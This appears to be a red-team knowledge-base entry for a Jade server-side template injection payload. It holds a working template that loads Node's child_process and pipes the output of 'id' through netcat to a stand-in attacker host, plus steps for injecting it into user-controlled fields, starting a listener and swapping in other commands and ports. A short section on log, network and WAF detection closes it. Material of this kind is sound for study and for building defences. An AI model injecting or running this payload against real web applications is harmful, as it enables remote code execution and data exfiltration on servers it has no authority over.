---
type: code
language: jade
verified: true
platforms:
  - web
  - linux
tags:
  - ssti
  - rce
  - payload
validated: true
---

# jade-ssti-exec-command-payload

## Code

```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

## Description

This Jade template payload exploits SSTI to execute arbitrary shell commands via Node.js child_process.exec, exfiltrating output through netcat to an attacker-controlled endpoint. It accesses the process object to require modules and run code server-side, enabling RCE in vulnerable web apps.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Command in exec | Shell command to execute (replace 'id') | 'ls -la /' |
| nc target (attacker.net) | Attacker IP/hostname | '192.168.1.100' |
| Port (80) | Exfiltration port | '4444' |

## Usage

Inject this payload into a user-controlled template parameter (e.g., username field in a Node.js/Jade app). Start nc -lvnp <port> on attacker machine first. Customize parameters before injection via browser, curl, or Burp. Used in red team ops for command execution post-vulnerability confirmation.

## Detection

- Monitor web app logs for 'child_process' requires or exec calls in template renders.
- Network traffic: Outbound nc connections from web server to unusual IPs/ports.
- Process monitoring: Unexpected shell spawns (e.g., via auditd or Sysmon) from Node.js processes.
- WAF rules for Jade syntax like 'root.process' or 'x.exec' in inputs.

## Related

- [[procedures/server-side-template-injection-jade-exec-command-and-list-users]]
- [[tools/Netcat]]
